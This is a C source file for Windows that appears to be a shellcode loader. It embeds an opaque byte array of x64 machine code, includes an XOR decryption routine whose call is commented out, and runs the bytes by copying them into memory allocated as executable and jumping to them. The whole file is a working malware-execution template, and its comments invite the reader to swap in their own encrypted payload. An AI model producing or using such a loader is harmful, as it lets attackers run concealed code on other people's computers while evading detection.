#include <windows.h>
#include <stdio.h>
// XOR decryption function
void xor_decrypt(char* encrypted_payload, int payload_length, char key) {
    for (int i = 0; i < payload_length; ++i) {
        encrypted_payload[i] ^= key;
    }
}

int main() {
    // Encrypted payload (replace with your encrypted payload)
    char encrypted_payload[] = "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x3e\xf6\xfa\x21\x11\x77\xd4\x60\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xc2\xbe\x79"
"\xc5\xe1\x9f\x14\x60\x3e\xf6\xbb\x70\x50\x27\x86\x31\x68"
"\xbe\xcb\xf3\x74\x3f\x5f\x32\x5e\xbe\x71\x73\x09\x3f\x5f"
"\x32\x1e\xbe\x71\x53\x41\x3f\xdb\xd7\x74\xbc\xb7\x10\xd8"
"\x3f\xe5\xa0\x92\xca\x9b\x5d\x13\x5b\xf4\x21\xff\x3f\xf7"
"\x60\x10\xb6\x36\x8d\x6c\xb7\xab\x69\x9a\x25\xf4\xeb\x7c"
"\xca\xb2\x20\xc1\xfc\x54\xe8\x3e\xf6\xfa\x69\x94\xb7\xa0"
"\x07\x76\xf7\x2a\x71\x9a\x3f\xcc\x24\xb5\xb6\xda\x68\x10"
"\xa7\x37\x36\x76\x09\x33\x60\x9a\x43\x5c\x28\x3f\x20\xb7"
"\x10\xd8\x3f\xe5\xa0\x92\xb7\x3b\xe8\x1c\x36\xd5\xa1\x06"
"\x16\x8f\xd0\x5d\x74\x98\x44\x36\xb3\xc3\xf0\x64\xaf\x8c"
"\x24\xb5\xb6\xde\x68\x10\xa7\xb2\x21\xb5\xfa\xb2\x65\x9a"
"\x37\xc8\x29\x3f\x26\xbb\xaa\x15\xff\x9c\x61\xee\xb7\xa2"
"\x60\x49\x29\x8d\x3a\x7f\xae\xbb\x78\x50\x2d\x9c\xe3\xd2"
"\xd6\xbb\x73\xee\x97\x8c\x21\x67\xac\xb2\xaa\x03\x9e\x83"
"\x9f\xc1\x09\xa7\x69\xab\x76\xd4\x60\x3e\xf6\xfa\x21\x11"
"\x3f\x59\xed\x3f\xf7\xfa\x21\x50\xcd\xe5\xeb\x51\x71\x05"
"\xf4\xaa\x87\x61\xc2\x68\xb7\x40\x87\x84\xca\x49\x9f\xeb"
"\xbe\x79\xe5\x39\x4b\xd2\x1c\x34\x76\x01\xc1\x64\x72\x6f"
"\x27\x2d\x84\x95\x4b\x11\x2e\x95\xe9\xe4\x09\x2f\x42\x70"
"\x1b\xb7\x4e\x5b\x8e\x9f\x21\x11\x77\xd4\x60";

     // Example encrypted payload

    // XOR key
    char xor_key = 's';

    // Decrypt the payload
    // xor_decrypt(encrypted_payload, sizeof(encrypted_payload) - 1, xor_key);

  void *exec = VirtualAlloc(0, sizeof(encrypted_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, encrypted_payload, sizeof(encrypted_payload));
	((void(*)())exec)();


    return 0;
}
